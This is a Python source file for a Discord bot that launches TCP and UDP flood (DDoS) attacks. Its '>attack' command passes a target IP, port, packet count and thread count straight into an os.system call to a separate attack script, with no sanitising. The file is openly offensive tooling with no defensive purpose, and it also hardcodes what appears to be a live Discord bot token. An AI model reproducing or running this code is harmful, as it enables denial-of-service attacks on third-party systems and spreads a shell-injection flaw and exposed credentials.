import discord
import os
import time
from discord.ext import commands

owners  = [416279655004504066]

client = commands.Bot(command_prefix=">", help_command=None)

@client.event
async def on_ready():
    print("DDoS bot started")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"Ready to attack!"))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("Command not found")
    if isinstance(error, commands.MissingRequiredArgument):
        if ctx.command.qualified_name == 'TCP':
            await ctx.send("**>attack TCP IP PORT PACKET THREADS**")
        if ctx.command.qualified_name == 'UDP':
            await ctx.send("**>attack UDP IP PORT PACKET THREADS**")

@client.command()
async def ping(ctx):
    embed=discord.Embed(
        title=f"Bot HTTP Ping is {round(client.latency * 1000)}ms",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

@client.command()
async def attack(ctx, method, ip, port, times, threads):
    if ctx.author.id not in owners:
        await ctx.send("You are not authorised to use this command.")
    else:
        await ctx.send(f"Succesfully sent Attack to {ip}:{port}")
        os.system(f"py main.py {method} {ip} {port} {times} {threads}")

@client.command()
async def help(ctx):
    await ctx.send("```\n>Ping\n>Methods\n>Usage```")

@client.command()
async def usage(ctx):
    await ctx.reply(">attack METHOD IP PORT PACKET THREADS")

@client.command()
async def methods(ctx):
    embed=discord.Embed(
        title="- TCP\n- UDP",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

client.run("ODAxNzcxMjI0Njk0NjUyOTI4.YAlhpA.z-HWotae11iXL8MunMEK0wfTD0E", bot=True)
